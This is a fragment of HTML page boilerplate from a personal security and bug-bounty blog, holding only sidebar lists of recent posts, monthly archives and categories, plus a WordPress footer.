iPhone X</a></li><li> <a href="https://www.pizzapower.me/2023/12/30/bug-bounty-vps-box-part-2/">Bug Bounty VPS Box Part 2</a></li><li> <a href="https://www.pizzapower.me/2023/10/20/hacking-ramadda-white-box-web-apps-and-bug-bounty-tips/">Hacking RAMADDA, White Box Web Apps, and Bug Bounty Tips</a></li><li> <a href="https://www.pizzapower.me/2023/08/18/department-of-defense-researcher-of-the-month-and-more/">Department of Defense Researcher of the Month</a></li></ul></aside><aside id="archives-2" class="widget widget_archive"><h3 class="widget-title">Archives</h3><ul><li><a href='https://www.pizzapower.me/2024/11/'>November 2024</a></li><li><a href='https://www.pizzapower.me/2024/07/'>July 2024</a></li><li><a href='https://www.pizzapower.me/2023/12/'>December 2023</a></li><li><a href='https://www.pizzapower.me/2023/10/'>October 2023</a></li><li><a href='https://www.pizzapower.me/2023/08/'>August 2023</a></li><li><a href='https://www.pizzapower.me/2023/03/'>March 2023</a></li><li><a href='https://www.pizzapower.me/2023/02/'>February 2023</a></li><li><a href='https://www.pizzapower.me/2023/01/'>January 2023</a></li><li><a href='https://www.pizzapower.me/2022/11/'>November 2022</a></li><li><a href='https://www.pizzapower.me/2022/10/'>October 2022</a></li><li><a href='https://www.pizzapower.me/2022/09/'>September 2022</a></li><li><a href='https://www.pizzapower.me/2022/08/'>August 2022</a></li><li><a href='https://www.pizzapower.me/2022/06/'>June 2022</a></li><li><a href='https://www.pizzapower.me/2022/04/'>April 2022</a></li><li><a href='https://www.pizzapower.me/2022/02/'>February 2022</a></li><li><a href='https://www.pizzapower.me/2022/01/'>January 2022</a></li><li><a href='https://www.pizzapower.me/2021/12/'>December 2021</a></li><li><a href='https://www.pizzapower.me/2021/11/'>November 2021</a></li><li><a href='https://www.pizzapower.me/2021/10/'>October 2021</a></li><li><a href='https://www.pizzapower.me/2021/09/'>September 2021</a></li><li><a href='https://www.pizzapower.me/2021/08/'>August 2021</a></li><li><a href='https://www.pizzapower.me/2021/07/'>July 2021</a></li><li><a href='https://www.pizzapower.me/2021/06/'>June 2021</a></li><li><a href='https://www.pizzapower.me/2021/03/'>March 2021</a></li><li><a href='https://www.pizzapower.me/2021/01/'>January 2021</a></li><li><a href='https://www.pizzapower.me/2020/12/'>December 2020</a></li><li><a href='https://www.pizzapower.me/2020/11/'>November 2020</a></li><li><a href='https://www.pizzapower.me/2020/10/'>October 2020</a></li></ul></aside><aside id="categories-2" class="widget widget_categories"><h3 class="widget-title">Categories</h3><ul><li class="cat-item cat-item-128"><a href="https://www.pizzapower.me/category/appsec/">appsec</a></li><li class="cat-item cat-item-102"><a href="https://www.pizzapower.me/category/aws/">aws</a></li><li class="cat-item cat-item-5"><a href="https://www.pizzapower.me/category/blog/">blog</a></li><li class="cat-item cat-item-30"><a href="https://www.pizzapower.me/category/bug-bounty/">bug bounty</a></li><li class="cat-item cat-item-31"><a href="https://www.pizzapower.me/category/bugbounty/">bugbounty</a></li><li class="cat-item cat-item-42"><a href="https://www.pizzapower.me/category/certifications/">certifications</a></li><li class="cat-item cat-item-103"><a href="https://www.pizzapower.me/category/cloud/">cloud</a></li><li class="cat-item cat-item-3"><a href="https://www.pizzapower.me/category/coding/">coding</a></li><li class="cat-item cat-item-2"><a href="https://www.pizzapower.me/category/coding-webdev/">coding, webdev</a></li><li class="cat-item cat-item-99"><a href="https://www.pizzapower.me/category/cryptography/">cryptography</a></li><li class="cat-item cat-item-47"><a href="https://www.pizzapower.me/category/cve/">CVE</a></li><li class="cat-item cat-item-12"><a href="https://www.pizzapower.me/category/cybersecurity/">cybersecurity</a></li><li class="cat-item cat-item-95"><a href="https://www.pizzapower.me/category/devops/">devops</a></li><li class="cat-item cat-item-76"><a href="https://www.pizzapower.me/category/docker/">docker</a></li><li class="cat-item cat-item-84"><a href="https://www.pizzapower.me/category/golang/">golang</a></li><li class="cat-item cat-item-13"><a href="https://www.pizzapower.me/category/hacking/">hacking</a></li><li class="cat-item cat-item-49"><a href="https://www.pizzapower.me/category/infosec/">infosec</a></li><li class="cat-item cat-item-124"><a href="https://www.pizzapower.me/category/iot/">iot</a></li><li class="cat-item cat-item-134"><a href="https://www.pizzapower.me/category/jailbreak/">jailbreak</a></li><li class="cat-item cat-item-29"><a href="https://www.pizzapower.me/category/linode/">linode</a></li><li class="cat-item cat-item-20"><a href="https://www.pizzapower.me/category/linux/">linux</a></li><li class="cat-item cat-item-133"><a href="https://www.pizzapower.me/category/mobile/">mobile</a></li><li class="cat-item cat-item-59"><a href="https://www.pizzapower.me/category/offensive-security/">offensive security</a></li><li class="cat-item cat-item-60"><a href="https://www.pizzapower.me/category/offsec/">offsec</a></li><li class="cat-item cat-item-108"><a href="https://www.pizzapower.me/category/poc/">POC</a></li><li class="cat-item cat-item-83"><a href="https://www.pizzapower.me/category/powerwall/">powerwall</a></li><li class="cat-item cat-item-44"><a href="https://www.pizzapower.me/category/python/">python</a></li><li class="cat-item cat-item-43"><a href="https://www.pizzapower.me/category/security/">security</a></li><li class="cat-item cat-item-52"><a href="https://www.pizzapower.me/category/self-hosting/">self hosting</a></li><li class="cat-item cat-item-6"><a href="https://www.pizzapower.me/category/site-news/">site news</a></li><li class="cat-item cat-item-81"><a href="https://www.pizzapower.me/category/solar/">solar</a></li><li class="cat-item cat-item-82"><a href="https://www.pizzapower.me/category/tesla/">tesla</a></li><li class="cat-item cat-item-53"><a href="https://www.pizzapower.me/category/torrents/">torrents</a></li><li class="cat-item cat-item-1"><a href="https://www.pizzapower.me/category/uncategorized/">Uncategorized</a></li><li class="cat-item cat-item-28"><a href="https://www.pizzapower.me/category/vps/">vps</a></li><li class="cat-item cat-item-4"><a href="https://www.pizzapower.me/category/webdev/">webdev</a></li><li class="cat-item cat-item-127"><a href="https://www.pizzapower.me/category/white-box/">white box</a></li></ul></aside></div></div><footer id="colophon" role="contentinfo"><div class="site-info"> <a href="https://wordpress.org/" class="imprint" title="Semantic Personal Publishing Platform"> Proudly powered by WordPress </a></div></footer></div> <script defer src="https://www.pizzapower.me/blog/wp-content/cache/autoptimize/js/autoptimize_e7d38106113fc4c998a2077980fcf26c.js"></script></body></html><!-- Cache Enabler by KeyCDN @ Thu, 21 Nov 2024 21:34:28 GMT (https-index.html) -->